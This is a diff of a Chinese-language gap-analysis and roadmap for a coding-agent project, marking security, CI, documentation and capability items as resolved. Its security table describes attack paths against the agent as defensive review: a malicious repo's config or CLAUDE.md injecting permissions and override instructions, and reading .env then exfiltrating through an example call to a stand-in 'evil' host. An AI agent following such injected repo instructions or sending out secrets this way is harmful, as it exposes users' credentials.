@@ -86,15 +86,15 @@
 
 | # | 差距 | 证据 | 后果 |
 |---|------|------|------|
-| S1 | **repo 内配置可以放权**：`agent.toml` 在仓库里，`[permissions].allow`、`[[hooks.external]]`（任意命令/URL）、`[sandbox].excluded_commands` 都从它读取，没有信任分层 | `config.py:479 resolve_permission_rules`、`config.py:364 resolve_hooks_config`；`agent.toml.example:144` 自己注明 "SECURITY: these run arbitrary commands/URLs from THIS project's agent.toml" | 克隆一个恶意仓库 = 注入 allow 规则 + 外部 hook。参考项目为此设计了 rule `source` + `allowManagedPermissionRulesOnly`（`src/types/permissions.ts` PermissionRuleSource） |
-| S2 | **CLAUDE.md 被当作最高优先级指令注入**："These instructions OVERRIDE any default behavior and you MUST follow them exactly" | `context.py:38 CLAUDE_MD_PREAMBLE` | 与项目自己的 provenance 哲学冲突：git 输出被标 untrusted（`context.py:190`），但同样来自 repo 的 CLAUDE.md 却拿到 OVERRIDE 级信任。恶意 repo 的 CLAUDE.md 即提示注入 |
-| S3 | **敏感路径安全网太窄**：只查 `path/file_path` 参数、只护 `.git/.polaris/.claude/agent.toml/settings*.json`，`.env`、密钥文件不在内；READ 工具完全不设防 | `permissions.py:22-24, 161-177` | `read_text_file(".env")` 默认放行 → 结合 S4 形成完整外渗链 |
-| S4 | **web 工具 risk=READ 默认放行**，无默认域名策略 | `tools/web.py:172,219` | prompt 注入后可 `web_fetch("https://evil/?d=<secrets>")` 外带数据。SSRF 防了，外渗没防 |
-| S5 | **子代理权限放大**：teammate 强制 `permission="auto"`（`react.py:1560`）；`dispatch_agent` 本身 risk=WRITE（`tools/subagent.py:54`），auto/dontask 模式自动放行 | 同左 | 父代理的 ask 交互被子代理绕过；`preset="full"` 子代理拿到 WRITE 工具无需确认 |
-| S6 | **沙箱与权限的耦合默认放松**：`auto_allow_command_if_sandboxed=true` 默认 | `sandbox/config.py`；对照参考 strict 配置 `autoAllowBashIfSandboxed: false` | 沙箱一开、命令提示全跳过；而容器逃逸/挂载写穿是真实风险面 |
-| S7 | **外部 hook 一律 fail-open**："degrades to allow + log on any failure — never sink a run" | `hook_adapters.py` 全部适配器；CLAUDE.md 明文 | 对观测 hook 正确；但用户想用 hook 做安全 gate（如命令审计器）时，hook 崩溃 = 门自动打开，无 per-hook fail-closed 选项 |
-| S8 | **session "always allow" 以工具名为粒度** | `permissions.py:148 self._session_allow.add(tool.name)` | 对 `bash/powershell` 答一次 "always" = 本会话放行一切后续任意命令。参考项目按命令前缀规则记忆 |
-| S9 | **`bypass` 模式无部署护栏** | `permissions.py:33` | 参考项目 `--dangerously-skip-permissions` 要求 "sandbox only"，且有 `disableBypassPermissionsMode` 策略开关；本项目 bypass 与沙箱可用性无联动 |
+| S1 | ~~**repo 内配置可以放权**：`agent.toml` 在仓库里，`[permissions].allow`、`[[hooks.external]]`（任意命令/URL）、`[sandbox].excluded_commands` 都从它读取，没有信任分层~~ | `config.py:479 resolve_permission_rules`、`config.py:364 resolve_hooks_config`；`agent.toml.example:144` 自己注明 "SECURITY: these run arbitrary commands/URLs from THIS project's agent.toml" | 克隆一个恶意仓库 = 注入 allow 规则 + 外部 hook。参考项目为此设计了 rule `source` + `allowManagedPermissionRulesOnly`（`src/types/permissions.ts` PermissionRuleSource） |
+| S2 | ~~**CLAUDE.md 被当作最高优先级指令注入**："These instructions OVERRIDE any default behavior and you MUST follow them exactly"~~ | `context.py:38 CLAUDE_MD_PREAMBLE` | 与项目自己的 provenance 哲学冲突：git 输出被标 untrusted（`context.py:190`），但同样来自 repo 的 CLAUDE.md 却拿到 OVERRIDE 级信任。恶意 repo 的 CLAUDE.md 即提示注入 |
+| S3 | ~~**敏感路径安全网太窄**：只查 `path/file_path` 参数、只护 `.git/.polaris/.claude/agent.toml/settings*.json`，`.env`、密钥文件不在内；READ 工具完全不设防~~ | `permissions.py:22-24, 161-177` | `read_text_file(".env")` 默认放行 → 结合 S4 形成完整外渗链 |
+| S4 | ~~**web 工具 risk=READ 默认放行**，无默认域名策略~~ | `tools/web.py:172,219` | prompt 注入后可 `web_fetch("https://evil/?d=<secrets>")` 外带数据。SSRF 防了，外渗没防 |
+| S5 | ~~**子代理权限放大**：teammate 强制 `permission="auto"`（`react.py:1560`）；`dispatch_agent` 本身 risk=WRITE（`tools/subagent.py:54`），auto/dontask 模式自动放行~~ | 同左 | 父代理的 ask 交互被子代理绕过；`preset="full"` 子代理拿到 WRITE 工具无需确认 |
+| S6 | ~~**沙箱与权限的耦合默认放松**：`auto_allow_command_if_sandboxed=true` 默认~~ | `sandbox/config.py`；对照参考 strict 配置 `autoAllowBashIfSandboxed: false` | 沙箱一开、命令提示全跳过；而容器逃逸/挂载写穿是真实风险面 |
+| S7 | ~~**外部 hook 一律 fail-open**："degrades to allow + log on any failure — never sink a run"~~ | `hook_adapters.py` 全部适配器；CLAUDE.md 明文 | 对观测 hook 正确；但用户想用 hook 做安全 gate（如命令审计器）时，hook 崩溃 = 门自动打开，无 per-hook fail-closed 选项 |
+| S8 | ~~**session "always allow" 以工具名为粒度**~~ | `permissions.py:148 self._session_allow.add(tool.name)` | 对 `bash/powershell` 答一次 "always" = 本会话放行一切后续任意命令。参考项目按命令前缀规则记忆 |
+| S9 | ~~**`bypass` 模式无部署护栏**~~ | `permissions.py:33` | 参考项目 `--dangerously-skip-permissions` 要求 "sandbox only"，且有 `disableBypassPermissionsMode` 策略开关；本项目 bypass 与沙箱可用性无联动 |
 
 **S 项落地状态（2026-07-03，详见 §6.5）**：
 - ✅ **S1 已闭环** — repo 配置 TOFU 信任分层（`agent_core/trust.py` + `config.py` `_apply_repo_trust`）。
@@ -111,11 +111,12 @@
 - ✅ **S9 已闭环** — bypass/无头/auto 无沙箱即拒绝启动（`SandboxRequiredError`，D3）。
 
 ### 2.2 工程化差距
-- **E1 无 CI**：仓库没有任何 workflow / lint / type-check 配置；CLAUDE.md 反而写明
-  "don't reach for ruff/black/mypy"。学习期合理，工业化不可接受。
-- **E2 测试依赖混入运行时**：`pytest`/`pytest-asyncio` 在核心 dependencies
-  （`pyproject.toml:22-23`），因为 `run_tests` 工具硬编码 pytest（`tools/builtin.py:348`）。
-  运行时 import 面与开发面无边界。
+- ~~**E1 无 CI**：仓库没有任何 workflow / lint / type-check 配置；CLAUDE.md 反而写明
+  "don't reach for ruff/black/mypy"。学习期合理，工业化不可接受。~~
+  **已闭环**：`.github/workflows/ci.yml` 覆盖 Windows/Linux/macOS、pytest、ruff、mypy 与安装器冒烟。
+- ~~**E2 测试依赖混入运行时**：`pytest`/`pytest-asyncio` 在核心 dependencies；
+  运行时 import 面与开发面无边界。~~ **已闭环**：两者已移入 `[dev]`，`run_tests`
+  会探测 pytest 并在缺失时给出 actionable error。可配置非 pytest runner 仍未实现（见 §5.3）。
 - **E3 "一切皆核心依赖" 无分层**：~~`rich`、`prompt_toolkit`（纯 CLI/TUI）、
   `ddgs/bs4/markdownify`（web）、三个 `mcp-server-*` 全部塞进 core
   （`pyproject.toml:10-24`）。~~ **已闭环（2026-07-03，按 D9 形状）**：core 仅
@@ -124,12 +125,13 @@
   （`react.py:300-303`）——构造一个 agent 可能触发拉容器镜像 / 启动 VM；且**每个子代理
   构造都会再跑一遍**（子代理经由完整 `ReActAgent.__init__`）。"eager" 应该指
   "启动时验证依赖并给出可操作错误"，不应指"构造函数里做重副作用且每实例重复"。
-- **E5 静默吞错不可见**：大量 `except Exception: return/pass` 无任何日志
-  （如 `react.py:401 _load_skills`、`sandbox/manager.py:168-170 reset`）。降级哲学正确，
-  但**降级必须可见**（至少 debug 级日志或 JSONL 事件）。项目完全没有使用 `logging`。
-- **E6 事件与转写无 schema 版本**：`runs/*.jsonl`（`storage.py:29`）与 transcript 记录
-  没有 `schema_version` 字段，重放/升级工具无从判断格式。**[推测]** 未来做回放和
-  跨版本兼容时会付出代价。
+- **E5 静默吞错仍未完全清零**：原列 `react.py` / `sandbox/manager.py` 路径已补日志，
+  但新增代码仍有无可见性的 `except Exception: pass/return`（如 `react.py:499`、
+  `lsp.py:194,262`、`process_supervisor.py:170`）。降级哲学正确，但**降级必须可见**
+  （至少 debug 级日志或 JSONL 事件）。
+- ~~**E6 事件与转写无 schema 版本**：`runs/*.jsonl`（`storage.py:29`）与 transcript 记录
+  没有 `schema_version` 字段，重放/升级工具无从判断格式。~~ **已闭环**：两类记录均写入
+  `v = SCHEMA_VERSION`，并由 `tests/test_storage_schema.py` 覆盖。
 - **E7 `storage.py` 每事件开关文件**（`storage.py:35`）。~~**[推测]** 高频工具调用下的
   IO 开销未测量，先测量再优化。~~ **已测量并已改（2026-07-03）**：Windows 主开发机基准
   （1k/10k 事件，3 次取最优）：open-per-event ≈ 2.7–3.4k events/s，
@@ -142,13 +144,15 @@
   （`models.py`）。
 
 ### 2.3 能力差距（相对 "成熟 coding agent" 目标）
-- **C1** ~~无 Glob 工具~~（已过时：`GlobTool` 已存在，`tools/editing.py:31`）。
-  剩余部分：`search_text` 为纯 Python 逐文件扫（`tools/builtin.py:192`），
-  大仓库上明显慢于 ripgrep。**[推测：性能量级，未基准]**
-- **C2** 无向用户提问的工具（参考 AskUserQuestionTool）——交互模式下模型只能猜。
-- **C3** 无后台/长任务管理（参考 Task* 工具族）：`bash/powershell` 超时即杀，
-  无法启动 dev server 再观察。
-- **C4** 无 LSP/诊断集成；无 notebook 编辑。（长期项，非近期必需）
+- **C1** ~~无 Glob 工具；`search_text` 仅以纯 Python 逐文件扫描，无法利用 ripgrep。~~
+  **已闭环**：`GlobTool` 已存在；`search_text` 优先使用 `rg`，失败时可观测地回退纯 Python（W11）。
+- **C2** ~~无向用户提问的工具（参考 AskUserQuestionTool）——交互模式下模型只能猜。~~
+  **已闭环（2026-07-20）**：`tools/local.py AskUserQuestionTool` 仅在存在 live callback 时注册。
+- **C3** ~~无后台/长任务管理（参考 Task* 工具族）：`bash/powershell` 超时即杀，
+  无法启动 dev server 再观察。~~ **已闭环（2026-07-20）**：`ProcessSupervisor` +
+  `bash`/`powershell` 的 `run_in_background`、自动转后台、`task_output`、`task_stop`。
+- **C4** ~~无 LSP/诊断集成；无 notebook 编辑。（长期项，非近期必需）~~
+  **已闭环（2026-07-20）**：按需加载的 `lsp` 与 `notebook_edit` 工具已落地。
 - **C5** ~~hook 事件面缺口：无 SessionStart/SessionEnd、SubagentStart/SubagentStop、
   **PermissionRequest**（程序化审批 seam——无头部署没有交互 prompter 时，
   ask 一律塌缩为 deny，`permissions.py:63-65`，只能靠预写规则）、PostToolUseFailure。~~
@@ -157,14 +161,16 @@
   **已闭环（2026-07-04）**：`polaris replay <run_id>` 时间线重放（见 W8）。
 
 ### 2.4 文档差距
-- **D1 引用已删除文档**：CLAUDE.md 引用 `docs/compaction-openclaudecode-alignment.md`、
-  `docs/sandbox-openclaudecode-alignment.md`，但 commit `2961aae` 已删除整个 `docs/`。
+- ~~**D1 引用已删除文档**：CLAUDE.md 引用 `docs/compaction-openclaudecode-alignment.md`、
+  `docs/sandbox-openclaudecode-alignment.md`，但 commit `2961aae` 已删除整个 `docs/`。~~
+  **已闭环**：新版 CLAUDE.md 已移除失效引用，并指向现存配置与安装文档。
 - **D2 Code Map 缺失模块**：`terminal/`（424 行交互 app + 补全 + model picker）、
   `transcript.py`（514 行）、`tool_use_summary.py`、`model_catalog.py` 未出现在 Code Map。
 - **D3 Configuration 段不全**：未提及 `[limits]/[session]/[context]/[hooks]/[sandbox]/
   [permissions]/[compression]/[concurrency]/[output]`（`agent.toml.example` 全都有）。
-- **D4 文档与实配矛盾**：CLAUDE.md 说 "Memory is off by default"，
-  但 `agent.toml:31 enabled = true`（内置默认确实 off，仓库实配 on——表述需要精确化）。
+- ~~**D4 文档与实配矛盾**：CLAUDE.md 说 "Memory is off by default"，
+  但 `agent.toml:31 enabled = true`（内置默认确实 off，仓库实配 on——表述需要精确化）。~~
+  **已闭环**：CLAUDE.md 已明确区分 built-in default 与 repository configuration。
 - **D5 过度绑定参考实现**：CLAUDE.md 与模块 docstring 中十余处
   "mirrors the reference / parity with the reference"。参考被当成了正当性来源与目标上限。
 
@@ -184,18 +190,21 @@
 8. 降级哲学（malformed skill/config 降级不崩溃）——但需补"降级必须可观测"。
 
 ### 不适合工业化目标（需要改写或删除）
-1. **"Open-ClaudeCode 对齐" 作为设计语言**：所有 "parity with the reference" 表述。
-   参考只应是启发来源；正当性必须来自本项目自己的目标。
-2. **"There are currently no extras — all deps are core"**：应改为分层依赖策略（见 R2）。
-3. **eager-loading 不变量的现表述**（"import and initialize their deps at startup,
+1. ~~**"Open-ClaudeCode 对齐" 作为设计语言**：所有 "parity with the reference" 表述。
+   参考只应是启发来源；正当性必须来自本项目自己的目标。~~
+2. ~~**"There are currently no extras — all deps are core"**：应改为分层依赖策略（见 R2）。~~
+3. ~~**eager-loading 不变量的现表述**（"import and initialize their deps at startup,
    NOT lazily"）：无边界。应改为"启动时验证 + 可操作错误；重副作用（拉镜像/起 VM）
-   必须显式、幂等、每进程一次"。
-4. **"no lint/format tooling configured (don't reach for ruff/black/mypy)"**：翻转为
-   渐进引入（先 ruff E/F + CI）。
-5. **fail-open 表述无限定**："degrades to allow + log on any failure — never sink a run"
-   应限定于观测类 hook；控制类 hook 须支持 fail-closed。
-6. **缺失章节**：无安全模型（信任分层）、无 CI/验收标准、无可观测性要求、
-   无部署形态（库 vs CLI）承诺。
+   必须显式、幂等、每进程一次"。~~
+4. ~~**"no lint/format tooling configured (don't reach for ruff/black/mypy)"**：翻转为
+   渐进引入（先 ruff E/F + CI）。~~
+5. ~~**fail-open 表述无限定**："degrades to allow + log on any failure — never sink a run"
+   应限定于观测类 hook；控制类 hook 须支持 fail-closed。~~
+6. ~~**缺失章节**：无安全模型（信任分层）、无 CI/验收标准、无可观测性要求、
+   无部署形态（库 vs CLI）承诺。~~
+
+以上 1–6 已由新版 CLAUDE.md、依赖分层、CI 与 hook `fail_mode` 设计闭环。模块内部仍有
+参考实现措辞，故 §2.4 D5 继续保留为未完成项。
 7. **失效引用与缺失模块**（D1/D2/D3）。
 
 ---
@@ -248,25 +257,25 @@
 1. **降级可见性原则**：所有 `except Exception` 降级路径必须发出结构化事件
    （JSONL + stdlib logging）。"degrade silently" 应从项目词汇表中移除，
    换成 "degrade observably"。（解 E5）
-2. **配置注入的最小闭环**：不必先做完整四层设置。第一步只需：
+2. ~~**配置注入的最小闭环**：不必先做完整四层设置。第一步只需：
    `resolve_permission_rules`/`resolve_hooks_config`/`resolve_sandbox_config`
    区分 "repo 文件" 与 "用户目录文件（`~/.polaris/agent.toml`）" 两个来源，
    repo 来源的 allow 规则、外部 hook、excluded_commands 默认忽略并告警
-   （或要求一次性用户确认后写入用户级信任清单）。两层就够起步。
+   （或要求一次性用户确认后写入用户级信任清单）。两层就够起步。~~
 3. **`run_tests` 去 pytest 硬编码**：改为可配置 test runner 命令（默认探测 pytest），
    缺失时给 actionable error——顺势把 pytest 移出运行时依赖。（解 E2）
-4. **schema_version 从第一天加**：`storage.py` 与 `transcript.py` 的每条记录加
-   `"v": 1`。改动 4 行，将来省一个迁移工程。（解 E6）
-5. **`polaris replay <run_id>`**：读 JSONL 重演 UI 事件流（不重发 API），
-   把已有的可观测数据变成可调试资产。（解 C6）
-6. **沙箱 prepare 幂等化 + 进程级共享**：`SandboxManager.prepare()` 结果按配置指纹
-   缓存（进程级），子代理复用父代理的 manager 而非各自构造。（解 E4 的一半）
-7. **bypass–sandbox 联动**：`permission=bypass` 且沙箱不可用时默认拒绝启动
+4. ~~**schema_version 从第一天加**：`storage.py` 与 `transcript.py` 的每条记录加
+   `"v": 1`。改动 4 行，将来省一个迁移工程。（解 E6）~~
+5. ~~**`polaris replay <run_id>`**：读 JSONL 重演 UI 事件流（不重发 API），
+   把已有的可观测数据变成可调试资产。（解 C6）~~
+6. ~~**沙箱 prepare 幂等化 + 进程级共享**：`SandboxManager.prepare()` 结果按配置指纹
+   缓存（进程级），子代理复用父代理的 manager 而非各自构造。（解 E4 的一半）~~
+7. ~~**bypass–sandbox 联动**：`permission=bypass` 且沙箱不可用时默认拒绝启动
    （可用显式 `--i-know-what-im-doing` 式开关覆盖），呼应参考的 "sandbox only" 但
-   机制为本项目自有。（解 S9）
-8. **CLAUDE.md 注入语气分级**：repo 指令作为"高优先级工程约定"注入，但 preamble
+   机制为本项目自有。（解 S9）~~
+8. ~~**CLAUDE.md 注入语气分级**：repo 指令作为"高优先级工程约定"注入，但 preamble
    明示"不得凌驾安全策略与用户显式指令"；保留 `[context].project_instructions`
-   开关。（解 S2，不需要大改架构）
+   开关。（解 S2，不需要大改架构）~~
 
 ---
 
@@ -277,7 +286,7 @@
 | Q1 | 重写 CLAUDE.md（阶段 4 已含） | 文档 | 无 | 人工复核 | ✅ |
 | Q2 | 敏感路径清单扩展：`.env`、`*.pem`、`id_rsa*`、`.ssh/`、`.aws/`、`credentials*`；并对 READ 工具启用安全网 | `permissions.py` | 低（多几次确认提示） | `test_permissions.py`：读 .env 触发 ask | ✅ |
 | Q3 | JSONL/transcript 记录加 `schema_version` | `storage.py`、`transcript.py` | 极低 | `test_storage_schema.py` | ✅ |
-| Q4 | 静默 `except` 补事件/日志（react.py、sandbox 已补） | ~5 个点 | 极低 | 灰盒 | ✅ 全部（skills prompt builder 已补，2026-07-03） |
+| Q4 | 静默 `except` 补事件/日志（react.py、sandbox 已补） | ~5 个点 | 极低 | 灰盒 | ⚠️ 原列点已补；新增模块仍有静默路径，见 E5 |
 | Q5 | `_session_allow` 改为按规范化命令前缀记忆（bash/powershell 特例） | `permissions.py` | 低 | 用例：always 后不同命令仍提示 | ✅ |
 | Q6 | pytest 移入 `[dev]` extra；`run_tests` 探测 + actionable error | `pyproject.toml`、`tools/builtin.py` | 中低（本地需 `pip install -e .[dev]`） | 无 pytest 环境冒烟 | ✅ |
 | Q7 | GitHub Actions：windows+ubuntu × pytest；ruff E/F + mypy 契约模块 | `.github/workflows/ci.yml` | 低 | CI 绿 | ✅ |
@@ -380,11 +389,20 @@ notebook）。
   MockTransport 驱动真实 ReAct 双轮 tool 往返证明。CLI `--provider openai` = `/v1/responses`，
   `--provider openai-compat` = `/v1/chat/completions`。
   （2026-07-04，GPT capability industrialization 2026-07-13）
+- [x] **W13** AskUserQuestion（C2）：`tools/local.py AskUserQuestionTool` 支持 1–3 个
+  结构化问题；`ReActAgent` 仅在有 live UI/callback 时保留该工具，无头模式不暴露。
+  （2026-07-20）
+- [x] **W14** 后台/长进程任务族（C3）：`ProcessSupervisor` 统一管理 Bash/PowerShell
+  进程树、持久化状态和有界日志；`run_in_background`、自动/`Ctrl+B` 转后台、
+  `task_output`、`task_stop` 已接入。（2026-07-20）
+- [x] **W15** 本地开发工具平台（C4 / R3）：Notebook 按稳定 cell ID 原子编辑并防陈旧覆盖；
+  LSP 延迟启动、超时/重启/沙箱约束；session/subagent/team worktree 隔离及脏状态保护。
+  `tests/test_tool_platform.py` 覆盖关键生命周期。（2026-07-20）
 
-**明确延后（观察需求再排期，见 R3 / D8）：**
-- AskUserQuestion 工具（C2，依赖 terminal 栈）。
-- 后台/长进程任务族（C3）。
-- LSP/诊断、worktree 隔离、notebook 编辑（C4）。
+**原明确延后项（已于 2026-07-20 落地）：**
+- ~~AskUserQuestion 工具（C2，依赖 terminal 栈）。~~
+- ~~后台/长进程任务族（C3）。~~
+- ~~LSP/诊断、worktree 隔离、notebook 编辑（C4）。~~
 - `prompt`/`agent` 外部 hook 恒为 advisory —— 设计如此，非未完成项。
 
 ## 7. 分阶段实现路线
@@ -429,15 +447,13 @@ Q1–Q5、Q10。产物：新 CLAUDE.md、敏感路径加固、可见降级、sch
 - `polaris replay <run_id>`。
 
 ### R3 — 能力扩展（6 周+，按需排期；D8：terminal 相关项排在安全/CI/provider 之后）
-> 状态（2026-07-04）：ripgrep 与 hook 事件补齐已完成；AskUserQuestion / 后台任务族 /
-> LSP / worktree / notebook 仍按需排期（§6.6"明确延后"）。
-- ~~Glob 工具~~（已完成，`tools/editing.py:31 GlobTool`）；`search_text` 探测 ripgrep
-  （有则用，无则回退纯 Python）。
-- AskUserQuestion 工具（仅交互模式注册；依赖 `terminal/` 栈，优先级按 D8）。
-- 后台任务族（启动/查询/停止长进程，配 bash/powershell 超时联动）。
+> 状态（2026-07-21）：本节列出的能力均已完成，详见 §6.6 W11、W13–W15。
+- ~~Glob 工具；`search_text` 探测 ripgrep（有则用，无则回退纯 Python）。~~
+- ~~AskUserQuestion 工具（仅交互模式注册；依赖 `terminal/` 栈，优先级按 D8）。~~
+- ~~后台任务族（启动/查询/停止长进程，配 bash/powershell 超时联动）。~~
 - ~~hook 事件补齐：SessionStart/End、SubagentStart/Stop、PostToolUseFailure。~~
   （已完成，见 §6.6 W9，2026-07-04）
-- LSP / worktree 隔离 / notebook：观察需求再排。
+- ~~LSP / worktree 隔离 / notebook：观察需求再排。~~
 
 ---
 
